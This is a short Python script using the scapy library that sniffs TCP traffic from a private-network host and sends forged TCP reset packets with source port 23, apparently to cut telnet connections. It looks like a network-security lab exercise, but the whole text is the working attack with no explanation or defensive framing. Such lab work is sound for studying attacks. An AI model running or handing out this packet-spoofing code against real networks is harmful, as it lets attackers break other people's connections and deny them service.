from scapy.all import *

def spoof_pkt(pkt):
    ip=IP(src=pkt[IP].src,dst=pkt[IP].dst)
    tcp=TCP(sport=23,dport=pkt[TCP].dport,flags="R",seq=pkt[TCP].seq+1)
    pkt = ip/tcp
    send(pkt,verbose=0)
    print("sent a packet\n")

f='tcp and src host 192.168.232.169'
pkt = sniff(filter=f,prn=spoof_pkt)
